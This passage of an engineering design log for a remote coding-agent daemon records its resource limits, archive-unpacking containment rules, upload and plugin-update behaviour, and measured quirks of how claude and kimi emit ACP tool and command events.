| Machines per user | **50 is the ceiling, not the limit.** It is the anti-abuse bound — creating one is reachable by anybody with a password, and each is a row plus an enrollment code plus a tunnel credential, against a `synchronous = FULL` file in the process carrying every tunnel. The *limit* is `machines.per_user`, a setting (env-seeded, database-owned) overridable per person in `user_machine_limits`, refused above the ceiling on both write paths and clamped again on read. **Unset resolves to 50**, which is the behaviour before the setting existed and deliberately not 0 — nothing seeds `instance_settings`, so a 0 default would take the whole fleet offline on deploy. Over the limit is **derived** from rank among `machine_owners` ordered by `(created_at, machine_id)`, never stored, so lowering switches off the newest and raising switches them back on with no recompute (Q1.51). Still counted with no revoked filter, which is why a revoke has to `releaseOwner` (Q1.43); `PUT …/owner` counts rows for *other* machines, so re-labelling one you already own is never your fifty-first — and it preserves `created_at` when the owner is unchanged, or an admin re-label would move a machine to the back of its own queue |
| Control-plane bodies | 64 KiB above THE LINE and 256 KiB below it. The two public routes are the only places in this service where somebody with **no credential** decides how many bytes it reads, and neither had ever bounded it; below the line there was no bound at all, on the reasoning that a caller past the gate has a credential — a statement about *who* is asking and not about *how much*, when every route calls `readJsonObject`, which buffers before it looks. Both answer `413 payload_too_large` in the envelope every client here parses, because `bodyLimit`'s default `onError` is `text/plain` and none of them can read it. `currentPassword`/`newPassword` are refused over 512 characters |
| Agent commands | 256 per session; 64 characters of name, 200 of description, 100 of hint — clamped at **ingest** in `session.ts`, like `MAX_PARENT_ID_CHARS`: the agent chooses the strings, the list rides no event so `truncateEvent` never sees it, and "bounded by what the agent sent" is not a bound. Measured 2026-08-03, claude publishes **100 commands / 18.7 KiB**, longest name 24, longest hint exactly 64, descriptions median 68 and max 1135. So 256 is for an MCP server publishing hundreds of prompts rather than for trimming a real list; the hint cap sits *above* the longest real one; the description cap is the only one that bites. **The name cap is a refusal and the other two are truncations** — `clip` appends `…[truncated N bytes]`, right for prose and wrong for a name, since a command is invoked by *sending* `/<name>`; dedup running on the unclipped name while the clipped one was stored made two long names collide with `dropped` reporting none. What is cut is *counted* into `dropped`, and the menu draws that count. Off the snapshot entirely; only `commandsRevision`, a number, rides the poll |
| Web client | 3 live sockets (LRU by most recently viewed), **16 MiB held per session and every event of it drawn** (`MAX_TRANSCRIPT_BYTES`, the **only** ceiling — the event count beside it is deleted, see Q3.114) — there is no render window under it, and the only cut is the newest `context_cleared`. History pages backwards at **5000** (`EVENTS_PAGE_LIMIT`) and **does not stop until it reaches the log's start, that cut, or those bytes** — there is no per-run budget and no control that offers to fetch more; `MAX_AUTO_HISTORY` (5000) is only where the loop yields the main thread. A page that fails is retried at 500ms and 2s, transport failures only, and `attachWanted` re-drives a run that gave up on the next poll a session list survives. What pays for it is `sameNode`. **60 sessions per machine per poll** — a pinned row that falls out of that window is invisible until the daemon's `listRank` keeps it, which is why pinned outranks live there. 4s list poll while visible, 15s re-probe for an unreachable machine, 1.5s reachability probe, token refreshed at `exp − 90s`, socket rotated at `exp − 60s`. 15s per request, except those that spawn a process — `POST /sessions`, `POST /sessions/:id/resume`, `POST /sessions/:id/config`, `GET /agents`, `/agent-auth/*` **and `POST /sessions/:id/prompt`** — which get 90s; the prompt is on that list unconditionally, because `request` is handed a method and a path and a deadline that depended on session state would be state leaking into the transport. A login transcript is polled every 700ms while its wizard is open, and one `GET /sessions/:id/commands` per session per revision change — for the open session only |
| Elicitation form | 24 fields, 24 options per field, **32 KiB** on the projected total, and an option value of 512 — all four **refusals**, because `clampBlob`'s `{truncated: true, bytes}` is fine above an Approve button and useless above a form. 512 characters of `message`, 100 of a field title, 300 of a description, all clipped: structure is refused and prose is truncated. 32 KiB rather than a permission's 8 because the form does **not** ride the snapshot. An answer over 2048 characters is refused on the route and never cut, while the *log's* rendering of it is clipped, visibly. Measured 2026-08-06 against live claude: a two-question `AskUserQuestion` is 4 fields, 4 options each, longest value 19 characters, ~2.5 KiB, and the tool's own schema caps it at 4 questions — so every one of these bounds the pathological case rather than a real form |
| Auto-resume | 3 attempts per session per **daemon life** — in memory, so a restart tries again, deliberately: a restart is new information and refusing to retry would make the deploy that fixes the bug fix nothing. 2 agents starting at once, because each is a node subprocess with a `claude` grandchild. Backoff 2s→60s with **full** jitter, since the attempts start together and a narrow band keeps them synchronised. The failure on the snapshot is capped at 64 characters of code and 512 of message — an order tighter than a pending permission's 8 KiB, because unlike a permission nothing here has to be *acted on* from the list, only recognised |
| Shutdown | 20s for the graceful stops, then a **bounded** 3s parallel SIGKILL sweep, inside `daemon.ts`'s 25s hard exit. The sweep is a syscall per session rather than an exec, so the bound costs nothing — and it stays, because the reason a teardown is bounded does not depend on what it costs |

#### Q5.100 — Why do the containment predicates have a *resolved* form as well?

**Rule.** `paths.ts` exports `containedInResolved` / `atOrUnderResolved` beside
`containedIn` / `atOrUnder`: the same segment-wise comparison, with the resolving
already done. An async caller holding two `probeRealpath` answers uses those, and
does not write a prefix test of its own.

**Why.** The synchronous primitives resolve internally, so handing them a path
somebody else named puts a synchronous `realpath` back on a path this daemon did
not create — the one thing `stall.ts` exists to stop (Q5.29), and the reason
`probeRealpath` is the bounded form of `paths.ts`'s own `resolved()` in the first
place. The alternative is a call site comparing two already-resolved strings by
hand, which is a second containment implementation: there is exactly one
containment primitive file precisely because a third copy disagreed with both
others once and fail-closed (Q5.32).

**Status.** Current
#### Q5.101 — What had to move before an attachment could be 100 MiB?

**Rule.** `MAX_UPLOAD_BYTES` is 100 MiB, `MAX_SESSION_UPLOAD_BYTES` is 1 GiB, and
a session may spend `UPLOAD_RATE_BYTES` (300 MiB) per `UPLOAD_RATE_WINDOW_MS`
(5 minutes) before a `429 upload_rate_limited` with `Retry-After`.

**Why.** 25 MiB was the right line for a screenshot and the wrong one the moment
somebody wanted to hand an agent a recording, a heap dump or a database export —
all attachments to a conversation in every sense except the size the old comment
assumed ("below anything that is a transfer rather than an attachment").

**The transport was never the constraint, which is the finding.** Nothing in
`src/`, the relay or the control plane configures a body limit; the running
counter in `Uploads.receive` is the only bound on any request body anywhere in
this system, and the relay's numbers are h2 flow control granted on consumption
rather than caps. So the raise itself is two constants.

**Three things were coupled to it and each would have failed *silently*.**

*The agent's own images.* `keepAgentImage` sized its base64 pre-check as
`ceil(limit * 4 / 3)` against this constant, so 100 MiB would have admitted a
~133 MiB **string** into one `Buffer.from` — on the emit path, which must not
await and must not allocate like that. `MAX_AGENT_IMAGE_BYTES` is that half,
unhooked at **the same 25 MiB**, so the decoupling changes no behaviour. They were
always different questions: one is how large a file somebody chooses from a
picker, the other is how large a blob a model hands back already in memory.

*The client's own deadline.* `uploadDeadlines` capped `hardMs` at 300 s
"deliberately: that is the token lifetime" — and conceded in its own next sentence
that a request in flight does not die at `exp`. So the coupling was tidiness
rather than a property, and at the new size it aborted a **progressing** 100 MiB
upload at five minutes, i.e. anything under ~350 KiB/s, with no message, halfway
through, on exactly the slow links a large cap matters on. The ceiling is 45
minutes now, which is above `scaled` at the largest file this daemon takes
(~35 min at the assumed 50 KiB/s floor) — so the formula governs at every real
size and the cap bounds arithmetic rather than transfers. What notices a dead link
is still `stallMs`, thirty seconds, reset by every progress event.

*The session budget.* 100 MiB per session with 100 MiB per file is a second bound
one file exhausts, which has stopped being one. 1 GiB, ten files at the cap;
`MAX_UPLOADS_PER_SESSION` is untouched, the inode ceiling never having been under
pressure.

**The rate window is soft, and the word is doing work.** Nothing here is a
security boundary: anybody reaching this route holds a grant on this machine, and
an agent on it runs as you with no sandbox — somebody who wants to fill this disk
has a far shorter path than an upload form. What it bounds is **cost**, which went
up 4× per file in the same change, against ceilings that never refill for the life
of a session. Shaped on the control plane's `WRITE_THROTTLE` rather than on its
guessing policies, and for the reason that one gives: a limit against cost blocks
briefly and **does not escalate**, because the caller is not an attacker to be
discouraged, it is somebody whose next action should be a moment later.

Charged on bytes **actually written**, refused or not — an upload that streamed
90 MiB before hitting the per-file cap cost that, and exempting refusals would
make the cheapest way to spend this daemon's disk bandwidth a stream that is
always one byte too long. Checked *before* the body is read, beside the count
check, because a refusal that has already streamed 100 MiB has spent exactly what
it was refusing to spend. It cannot see the current upload's size — a chunked body
declares nothing — so one upload may finish past the limit and the next is the one
refused, which is the right way round for a cost bound.

**Two numbers stopped meaning what their comments said.** `MAX_DOWNLOAD_BYTES` is
also 100 MiB and its docblock said "deliberately a different number"; it now
coincides **by accident**, and neither may be set by reading the other — the
*reasons* were what differed and are unchanged. And `MAX_IMPORT_BYTES` (50 MiB) is
now the smaller of the two, reversing their old order; its rule file justified it
by quoting `MAX_UPLOAD_BYTES`'s own comment, and the real reason had to be written
out: an archive is **expanded onto disk** as up to `MAX_IMPORT_ENTRIES` files, each
a containment decision and an inode, while one streamed file is one `open` and one
counter.

**The ceiling nobody in this repository can see.** `deploy/` ships no reverse proxy
and `install.sh` recommends one twice. nginx defaults `client_max_body_size` to
**1 MB** and refuses with a 413 *before* the daemon receives the request, so the
chip shows a failure the daemon has no record of; Cloudflare's 100 MB is not
configurable at all. `deploy/README.md` names the values now, which it never did
even at 25 MiB.

**Three stale comments went with it**, each claiming the relay's per-stream window
is 256 KiB. It has been 1 MiB since Q6.104, and being wrong about it in a paragraph
that reads as a measurement is worse than not stating it — they name
`STREAM_WINDOW_BYTES` now.

**Measured** by the drivers rather than by a run: `daemoncheck` drives the running
counter against the real constant, streaming a shared 8 MiB buffer rather than
allocating the whole cap on the heap, and drives `uploadRateVerdict` — pure, so
the window is asserted at the real numbers without writing 300 MiB to a temp
directory, which is the only alternative and enough of a cost that it would have
gone unasserted instead.

**Status.** Current


#### Q5.102 — Two callers unpack somebody else's archive. Why is there one unpacker?

**Rule.** `unpackArchive` is the middle of `importArchive`, extracted rather than
copied. `POST /fs/import` and `POST /plugins` both go through it, with their own
`ArchiveLimits`.

**Why.** Everything in that function is a containment rule: `..` refused rather
than normalised — normalising is how every surviving zip-slip works — `.git`
refused case-folded, backslashes never translated to slashes, absolute paths and
`C:` refused, and the size ceiling charged against what the **decompressor
produced** rather than against what a member declares. A second implementation of
that list is how one of the rules comes to be missing from one of them, which is
the argument `paths.ts` already wrote out for `containedIn` and the reason there
is exactly one containment primitive file.

**What is parameterised and what is not.** The *numbers* differ and are passed in:
`IMPORT_LIMITS` is somebody's whole source tree, `PLUGIN_LIMITS` is a manifest and
a file of JavaScript, and giving the second the first's headroom would mean the
bound that stops a zip bomb is 500 MiB for a thing never past a few hundred KiB.
Nothing in `safeMemberPath` is parameterised, because what a member path may *be*
does not depend on who is unpacking — a caller able to relax it would be a caller
able to accept `..`.

**What each caller keeps.** Where the result is published, what it is called, and
whether something is already there. Those genuinely differ, and nothing is shared
by pretending otherwise.

**Status.** Current

#### Q5.103 — An update that will not start must change nothing

**Rule.** If the newly installed version fails to start, the new directory is
removed, the row is left untouched, the previous version is started again, and the
refusal carries what the child actually said.

**Why.** The person installing is often not sitting in front of the machine — that
is the entire premise of this product — so the failure mode being designed against
is *a broken update leaves you with nothing*, discovered from a phone. Leaving the
plugin that was there is the only acceptable outcome, and it is only achievable
because the old version's directory is not removed until the new one is known to
run.

**Two defects this shape had while it was being built, both found by driving it.**
The failed start called `child.stop()` rather than `this.stop()` — and `stop()` is
what sets `stopping`, which is the only thing telling `onExit` a kill we asked for
from a crash. Without it the rollback **scheduled a restart for the plugin it was
in the middle of discarding**, which would have brought a broken update back to
life minutes after it was refused. And the surviving plugin's restart budget was
being spent by the rollback, so three refused updates left a working plugin that
would no longer start; it is returned before the restart now.

**What the refusal carries.** The child's last twenty lines of output, stdout as
well as stderr. "did not start within 10000ms" says nothing anybody can act on;
the `SyntaxError` their `server.js` threw says everything.

**Status.** Current

#### Q5.104 — What survives an update, and what is keyed on what

**Rule.** `plugin_data` is keyed on the plugin's **id** and never on its version.
An update replaces the row in `plugins` and touches nothing in `plugin_data`; an
uninstall drops both.

**Why.** This is the whole of what makes an update an update rather than a
reinstall. A board keeps its cards across `0.1.0` → `0.2.0` because no part of the
key mentions a version, and the demo plugin exists partly to make that
demonstrable in two commands.

**Why two tables rather than a JSON column on the row.** For the bound rather than
the shape: the per-plugin byte and key ceilings are enforced by counting rows, and
a blob makes "how many keys does this plugin hold" a parse. `checkPluginWrite`
lives beside the interface rather than inside the SQLite implementation, so the
memory implementation a driver uses refuses exactly what the real one refuses — a
quota that holds only where there is a file is a quota nothing drives.

**One arithmetic detail that is load-bearing.** The replaced value's length is
credited back before the new one is charged. Without it a plugin rewriting a
single key climbs to its own ceiling and stays there, which is the shape of every
settings pane written against this API.

**Status.** Current

#### Q5.105 — A root, compared against a path that does not exist yet

**Rule.** A component holding a root it will build paths under must resolve that
root **once**, at open, and keep the resolved form.

**Why.** `containedIn` resolves both sides and falls back to comparing as written
when `realpath` throws — which it does for every path about to be *created*. So a
caller keeping an unresolved root and joining onto it is comparing a resolved root
against an unresolved child, and the guard correctly answers no.

**Measured.** On macOS, where `/var` is a symlink to `/private/var`: the plugin
host refused to remove its own directory on **every** reinstall of a version it
already had — `refused to remove …/plugins/board/0.1.0, which is not under the
plugin root` — and the `rename` that followed then failed `ENOTEMPTY`. The symptom
was a warning nobody would have read and an install that worked the first time.

**Where this was already known.** `createWorkspace` solves the identical problem
for worktrees: it resolves the deepest component that exists and rebuilds the
not-yet-created leaves onto that answer, *or every `POST /sessions` throws
`outside_worktree_root` wherever the worktree root traverses a symlink*. That
sentence was in `files-paths-git.md` before this bug was written; the general form
is now stated at the primitive itself, and `worktree.ts`'s private twin of the
resolver is marked as the copy to delete next.

**Status.** Current

#### Q5.106 — A hook must never reach the emit path

**Rule.** Hook delivery is queued and drained on its own. Nothing on that path
awaits inside `SessionLog.append`, and the queue is bounded drop-oldest with the
drops reported.

**Why.** `append` is synchronous by contract and runs inside the agent's own RPC
handler — that is what makes gap-free attach true by construction. A hook that
blocked there would put a plugin between an agent and its transcript, and a plugin
that hangs would stop the session's events rather than its own screens.

**Why drop-oldest rather than drop-newest or unbounded.** Unbounded means a plugin
that stopped answering grows a queue for the life of the daemon. Between the two
directions, the newest events are the ones still worth acting on: a board catching
up cares about the turn that just ended, not the one from an hour ago.

**Why the drops are reported.** A plugin quietly missing half its events looks
exactly like a plugin with a bug in it, and the person who would investigate has
no way to tell the difference. It goes to `onWarning`.

**What crosses, and what deliberately does not.** A derived summary, never a
`StoredEvent`. The session event union is a wire three coding agents move, so
coupling a plugin to it would make every ACP change somebody else's breaking
change.

**Status.** Current

#### Q5.107 — A throwing observer is reported and kept

**Rule.** `SessionRegistry.watchSessions` guards each observer, reports a throw
through `onWarning`, and **does not evict it**.

**Why this is the opposite of the neighbouring rule, deliberately.**
`SessionLog.append` evicts a listener that throws, and is right to: there a
listener is one WebSocket, and evicting it costs that one socket its events while
every other listener carries on.

An observer here is a whole *subsystem*. Dropping the plugin host on one bad frame
would stop every hook on the machine for the life of the daemon, with nothing
anywhere saying so — the same shape of silent, permanent loss that the fan-out
guard's own comment warns about for sockets, one level larger.

**Asserted rather than assumed.** `daemoncheck` registers a throwing observer
**first**, so "the ones after it" is a real position rather than a hope about
iteration order, and checks that a second observer still sees every session, that
the thrower is called for each of them, and that each throw is reported.

**Status.** Current

## Measured behaviour of the agents and the tools

### Q6.1 — Why did `session_started` land in the log *after* the first `prompt` event?

**Behaviour.** `Session`'s event queue drained only during a turn, so nothing
appended outside one reached the log until a prompt existed to drain it. The
started event was therefore ordered behind the first prompt.

**Consequence.** A client that read `agent`, `cwd` or `agentSessionId` off the
transcript alone saw none of them until after the session's first message.

**Handled by.** The registry compensates with its own `status` event at seq 1,
and by carrying `agent`/`cwd`/`agentSessionId` on the snapshot independently of
the log.

**Status.** Superseded by Q2.44. A `ManagedSession` drains the queue between
turns now, so the event is recorded when the agent is adopted — measured, a
session's first five rows are `workspace`, `status`, `agent_config`, `status`,
`session_started`, and `daemoncheck` pins that list. Both compensations stay,
because neither ever depended on the ordering: the snapshot carries the controls
because they are state with one current version and because a *restored* session
has no live agent to publish them at all.

### Q6.2 — Where does a pending permission's command text actually live?

**Behaviour.** In `content`, not `rawInput`. kimi's `tool_call` event arrives
with `rawInput: null`, and the command appears exactly once, as an ACP *text*
content block on the permission request — `"Requesting approval to Running: echo
hello"`.

**Consequence.** The original design joined `toolCallId` against the log to find
the command, which produced an approve button above an empty box every single
time, for the one agent that actually asks. Treating text blocks as decoration
is the trap.

**Handled by.** `PendingPermissionSnapshot` carries `rawInput` **and** `content`,
both clamped to 8 KiB by `clampBlob` — they ride the *snapshot*, which
`GET /sessions` returns for every session at once, so the per-event 128 KiB cap
is far too loose here. The log join is kept as the fallback, for an agent that
fills in the `tool_call` instead.

**Measured.** Against kimi.

### Q6.3 — Is a subagent's parent link present on every event that belongs to it?

**Behaviour.** No. The spawn arrives as a `tool_call` with `kind: "think"`,
`_meta.claudeCode.subagent === true`, and — on the *first* notification — the
literal title `"Task"`, because the model's own description has not finished
streaming. Its steps arrive as ordinary top-level `tool_call`s carrying
`_meta.claudeCode.parentToolUseId`, byte-for-byte the parent's `toolCallId`,
always after the parent. But **4 of 10 and 5 of 14 of a child's updates omit the
parent** — the `toolResponse`-bearing ones rebuild their metadata from the tool
*result* and do not re-derive lineage — and **the spawn loses `subagent: true` on
its own completing update**.

**Consequence.** Absence means "this event did not say", never "top level". A
renderer keyed on the flag flickers off at the end of every subagent; a daemon
reading an absent link as top-level scatters half the steps back into the
transcript, intermittently.

**Handled by.** Both fields are read first-non-null.

**Measured.** 2026-08-01 against claude 2.1.220 / claude-agent-acp 0.63.0.

### Q6.4 — Why does a subagent's own text and thinking never appear?

**Behaviour.** By omission. `claude-agent-acp` gates them on
`clientCapabilities._meta["subagent-transcript"]`, and `src/acp/client.ts` sends
no `_meta` at all, so the SDK is passed `forwardSubagentText: false` and never
emits them.

**Consequence.** What survives is what the subagent *did* and what it
*concluded*, the latter on the parent's completing update. The reason is budget,
not trust — the capability grants the agent permission to *say more*, not a write
primitive in the daemon's process — and the log is 5000 events / 8 MiB evicting a
**prefix**, so a second full conversation per delegate (claude runs three to five
at once) does not degrade into less detail, it evicts the operator's own prompt.

**Handled by.** `pnpm daemoncheck` asserts the absence.

### Q6.5 — Is `Task*` the Task tool?

**Behaviour.** No. `isTaskTool` in the adapter matches
`TaskCreate|TaskUpdate|TaskList|TaskGet` — the task-list tools that replace
`TodoWrite` in headless sessions — so `shouldEmitToolCall("Task")` is true and
the spawn is an ordinary tool call. On claude 2.1.220 the tool is named `Agent`;
the adapter maps both.

**Consequence.** A client that filters on the name `Task` believing it to be the
delegation tool filters the wrong thing.

### Q6.6 — Could a subagent's `TodoWrite` overwrite the main agent's plan?

**Behaviour.** It would, and it cannot reach it today. `TodoWrite` is suppressed
as a tool call and rebuilt as `sessionUpdate: "plan"` *inside* the loop that
stamps `parentToolUseId`, and `PlanEvent` has full-replacement semantics with no
entry ids — so a delegate's list would silently overwrite the main agent's.
Measured, it does not, because **subagents have no `TodoWrite`** ("not available
in this session's toolset") and a main-agent `plan` carries no `_meta` to
attribute. Note also that one `TodoWrite` emits a `plan` per streaming
refinement — **9 events for a 3-item list** — each a full replacement.

**Consequence.** Latent rather than live. Re-check if subagents gain the tool.

**Handled by.** `PlanEvent` deliberately has no parent field: there is nothing to
attribute it from.

**Measured.** 2026-08-01.

### Q6.7 — Does a running subagent emit any progress heartbeat?

**Behaviour.** No. The adapter *can* turn `tool_progress` into an `in_progress`
update carrying `elapsedTimeSeconds`/`subagentType`/`subagentRetry`; measured
across a deliberate 45s `sleep`, **zero arrived**.

**Consequence.** A running spawn sits at `pending` until it completes, and the
only progress signal is its steps arriving.

**Handled by.** Nothing budgets for a heartbeat that does not exist.

### Q6.8 — How deep does delegation actually nest?

**Behaviour.** Nested delegation exists but is flat. A subagent *can* spawn
another (`subagent: true`, parented to the outer one) — but every other call
still comes back parented to the **outermost** spawn, so no third level is
reachable.

**Consequence.** `MAX_DEPTH` is defensive, not load-bearing — and it is defensive
about *indent*, not about the graph. It was mistaken for the cycle bound once and
the cost was a hung tab.

**Handled by.** The visited sets in `placeNodes` are what actually bound the
walks.

### Q6.9 — Is `usage_update` a per-turn summary?

**Behaviour.** No — it fires on essentially every output token. ACP's
`usage_update` comes out of the `message_delta` handler guarded only by "the
total changed", so it is `agent_message_chunk`-class traffic. It carries
`{used, size}`: *occupancy of the context window right now*.
`TurnEndEvent.usage` is a different quantity — ACP's `Usage`, cumulative token
*counts* for one turn.

**Consequence.** Two fields called "usage" in one vocabulary. Merging them would
be wrong in both directions: one is state, one is narrative.

**Handled by.** The occupancy figure is state and rides the snapshot as
`contextUsage` — deliberately not named `usage`; the per-turn counts stay in the
log.

**Measured.** 2026-07-31 against claude-agent-acp 0.63.0
(`acp-agent.js` `message_delta` handler).

### Q6.10 — Why does one tool call arrive as five separate events?

**Behaviour.** A single `echo` produces five notifications, and every useful
field lands on a different one:

| event | title | rawInput | content |
|---|---|---|---|
| `tool_call` | `Terminal` | `{}` | — |
| `tool_call_update` | `echo hi-there` | `{command}` | — |
| `tool_call_update` | `echo hi-there` | `{command, description}` | `["Echo hi-there"]` |
| `tool_call_update` | — | — | — |
| `tool_call_update` *completed* | — | — | ``["```console\nhi-there\n```"]`` |

**Consequence.** A client that keeps only the newest update loses the command
*and* the description; one that keeps only the first loses the output; and one
that prefers the call's own `rawInput` gets `{}` for ever, because an empty
object is not null.

**Handled by.** `EventList` resolves each field separately — newest non-null
status and title, newest **non-empty** arguments (`hasInput`, the same emptiness
rule the rendering uses), and every content block **that says something of its
own**, in order. The output also arrives wrapped in a markdown fence and is
rendered in a `<pre>`, so the fence is stripped rather than shown as three
literal backticks.

**Measured.** 2026-07-31 against claude 0.63.0.

**Status.** Current

### Q6.10a — Five events is the small case. What does a streamed tool call look like?

**Behaviour.** The model types the tool's *arguments* into the content channel one
token at a time, and every block is a strict extension of the last. One `Write`
call: a `tool_call`, then **715** `tool_call_update`s whose single content block
grew from `{` to the finished input JSON, then that same JSON once more beside the
`rawInput` it belongs to, then `Wrote 2347 bytes to tictactoe.py` — the only block
that is a result.

**Consequence.** "Every content block concatenated" drew all 717, so a card showed
716 growing copies of the arguments it was already rendering above them, and the
real output was the last line under them. That is the screenshot this was reported
from. It is also most of the log: across every session on the development machine
those superseded blocks are **15.4% of all events and 55.8% of all bytes**.

**Handled by.** Two rules in `tail.ts`, and both are needed because each is blind
to what the other catches. `supersedes` drops a block that the next one strictly
extends — a draft of the block that follows it. `restatesInput` drops a block that
parses to the call's own `rawInput`, which `supersedes` cannot see because the
streamed copies are pretty-printed (`{"path": "x"`) and the final one is compact
(`{"path":"x"`), so neither extends the other. `restatesInput` runs as a pass over
the folded list rather than inside it, because the pretty-printed copy arrives
*before* the `rawInput` it restates and cannot be judged until the call is whole.

**Rejected — byte equality alone.** `block === JSON.stringify(rawInput)` catches
26 blocks in that database and misses 26 more, which are the pretty-printed ones.
An intermediate version of the comment on `restatesInput` claimed parsing "matched
nothing further"; that was measured on pairs sharing a single event and is false
across a folded call.

**Rejected — collapsing an exact repeat.** `supersedes` requires a **strict**
extension. A tool that prints the same line twice has printed it twice, and
folding that would be this client editing output rather than declining to draw a
draft of it.

**Also handled at the daemon**, which is where the bytes actually are. `Session`
**holds** an update that says nothing but "the arguments are one token longer" and
sends it only when the run ends — `toolDraft`, flushed by the next event for any
call, by `turn_end`, by `error` and by `doDispose`. So a run reaches the log as its
first block and its last, and the drafts between them are never written, never
replayed down a socket and never paged over the relay.

**Held rather than dropped**, and the distinction is what makes it safe: the last
block of a run is the only complete one, so a tool whose output really is
cumulative would lose it. What is never held is anything carrying news — a status
change, a title, arguments, locations or images go out at once. That last clause is
load-bearing rather than cautious: `EventList` draws `in_progress` as a spinning
`Loader` and `pending` as a static glyph, so holding the update that first says
`in_progress` would leave a thirty-second file write looking like it had not
started.

**The rule is now stated twice and that is deliberate.** `packages/web` cannot
import from `src/`, so `supersedes` and `Session.holdsToolDraft` are two copies.
They are not required to agree, and the drift that matters can only go one way: the
client's fold is the **guarantee** — every transcript already on disk carries the
full 715 and always will — while the daemon's is an optimisation on top. A daemon
that suppresses less costs bytes; one that suppressed *more* than the client can
fold would lose content, which is why it holds instead of dropping.

**Measured.** 2026-08-13, against `~/.reemoat/reemoat.db`: 14 360 events over
every session, of which 2212 are superseded prefixes; longest run 715; folding
every call through `mergeUpdates` takes 2332 drawn blocks to 68. Replaying the
daemon's rule over the same stored events: **14 360 → 12 174 events and 3.58 →
1.59 MiB, i.e. 15.2% of the events and 55.6% of the bytes**.

### Q6.11 — Where does a tool's printed output arrive, and why was it lost?

**Behaviour.** On `tool_call_update.content`. `emitDiffs` kept `type: "diff"`
blocks and dropped the rest, so everything a Bash tool printed died at the daemon
and no client could show it however it was written.

**Consequence.** An agent that announced a bare call and filled the arguments in
afterwards also lost them entirely, because `rawInput` was never copied on the
update arm.

**Handled by.** `session.ts` now also extracts the text blocks onto the event and
copies `rawInput` on the update arm. `type: "terminal"` is still dropped: it is a
live handle, not a value.

### Q6.12 — How many `file_change` events does one `Edit` produce?

**Behaviour.** Two, and only the first carries a `toolCallId`: one event with
`source: "diff"` and the tool call's id, then a second with `source: "fs_write"`
and `toolCallId: null`.

**Consequence.** The log join *does* have something to join against for a kimi
edit, and a client that gives up on seeing `toolCallId: null` gave up on the
wrong one of the two. Anything deduplicating `file_change` by path has to expect
the pair.

**Measured.** 2026-07-30 against kimi.

### Q6.13 — Why is there no `insecure_origin` reachability check any more?

**Behaviour.** An https page could not reach an http daemon: the request never
left the browser, so probing anyway marked a healthy daemon unreachable with no
way to tell why, and `insecure_origin` was the answer. Both the check and the
reason are gone — there is one route and it is the relay, which is the same
origin and the same scheme as the UI, so there is no longer a mismatch to have.

**Consequence.** The symptom is memorable and somebody will otherwise go looking
for the code that reported it. It is recorded for that reason alone.

### Q6.14 — What does `REEMOAT_CP_HOST` default to, and what does that imply?

**Behaviour.** `127.0.0.1`. The control plane now also serves the web UI.

**Consequence.** A phone reaching the UI at all means binding wider than
loopback.

### Q6.15 — When does `available_commands_update` arrive, and why was it discarded?

**Behaviour.** Always outside a turn. Both adapters schedule it with
`setTimeout(…, 0)` *after* answering `session/new` — claude at
`acp-agent.js:665,681,689,698`, kimi from its own
`scheduleAvailableCommandsUpdate` — so it is guaranteed to land before any prompt
exists to drain `EventQueue`.

**Consequence.** It fell into `onUpdate`'s `default:` arm, i.e. became an `other`
event, which that queue evicts *first* on overflow and no client renders.
`OtherUpdateEvent`'s own comment named "available commands" as a casualty; it is
the third update to be promoted out of that arm for this reason. Two races sit
under it. The notification can land between `Session.start` resolving and the
subscription being attached, into an empty listener set, so a session that
started quickly would lose the whole list intermittently. And in `AcpClient`,
`router.sessions.get(id)?.onUpdate(...)` **drops** an update for a session it has
not registered yet, with registration happening in the microtask after the
`session/new` result is parsed.

**Handled by.** `onStarted` reads once before subscribing. Against real claude
0.63.0 over a real pipe the transport closes the second window comfortably —
`Session.agentCommands` is empty the instant `start` resolves and holds the list
1ms later — but with both ends in one process and a `PassThrough` between them it
loses every time, which is why `daemoncheck` pushes on a delay and says so rather
than pinning an artefact of having no kernel in the way.

**Measured.** 2026-08-03; the transport window against real claude 0.63.0.

### Q6.16 — Can two published commands share a name?

**Behaviour.** Yes. Of the 100 claude publishes on a development machine with
plugins installed, two are called `review` — a user skill and a built-in.

**Consequence.** Typing `/review` could only ever reach one of them, and a menu
offering the same word twice with different descriptions is a menu that cannot be
acted on.

**Handled by.** `toCommands` keeps the first and counts the second into
`dropped`.

### Q6.17 — Do the two agents publish the same commands?

**Behaviour.** They publish opposite things. claude's list is the CLI's
`supportedCommands()` — dozens of skills, plugins and `mcp:*` entries, minus a
hardcoded denylist (`clear`, `cost`, `keybindings-help`, `login`, `logout`,
`output-style:new`, `release-notes`, `todos`) — and it **republishes mid-session**
via `commands_changed` as skills are discovered in a subdirectory. kimi publishes
six builtins (`compact`, `status`, `usage`, `mcp`, `tasks`, `help`) plus
discovered skills, and **never republishes**. claude publishes `/model` and
`/effort`; kimi publishes neither, and neither publishes `/mode`. `/clear` is not
in either list, and that is the adapter rather than the daemon: claude's
`getAvailableSlashCommands` filters the same fixed eight out before the list is
ever sent — typing it still works, because an unmatched name is sent as written.

**Consequence.** A client that fetches once and caches for ever is correct on
kimi and wrong on claude.

**Handled by.** `commandsRevision` exists exactly to prevent that. `/model`,
`/effort` and `/mode` are built from the config options instead, and a built
command shadows a published one. Restoring `/clear` was a measurement rather than
a hope: verified against the live agent, 100 published, 99 kept, and the only
loss is the duplicate in Q6.16.

### Q6.18 — How big is claude's published command list, really?

**Behaviour.** 100 commands and 18.7 KiB — not the "dozens" a first estimate
assumed. Descriptions run to 1135 characters (a skill's whole trigger paragraph)
against a median of 68. The longest hint is exactly 64.

**Consequence.** That number settles where the list lives: on the snapshot it
would be ~1.1 MB per `GET /sessions` poll, every four seconds, over the relay, to
a phone. The description cap is the only one of the four caps that bites in
practice, and the menu truncates prose in CSS — the byte cap bounds the
*payload*, not the row. The hint cap is 100 rather than 64, because a bound set
to the largest thing you have seen is a bound that clips the next one.

**Measured.** 2026-08-03 against claude 0.63.0, on a machine with plugins
installed.

### Q6.19 — What happens to an unrecognised slash command?

**Behaviour.** kimi intercepts it; claude forwards it. kimi's
`detectSlashIntent` parses the leading text block and answers an unrecognised
name with "Unknown ACP command: /foo" and `stopReason: "end_turn"` — the model
never sees it. claude passes the text to the CLI, which decides.

**Consequence.** The divergence is the agents' own and this client deliberately
does not paper over it: an unmatched `/foo` is sent as typed, because the cached
list can lag what the agent accepts and refusing to send is a worse failure than
one wasted turn.

### Q6.20 — Why does the daemon never call ACP's `session/authenticate`?

**Behaviour.** Agents advertise `authMethods` at `initialize` — Gemini offers
four (`oauth-personal`, `gemini-api-key`, `vertex-ai`, `gateway`) and expects the
client to pick one. This daemon picks none: `agents.ts` says *"both agents
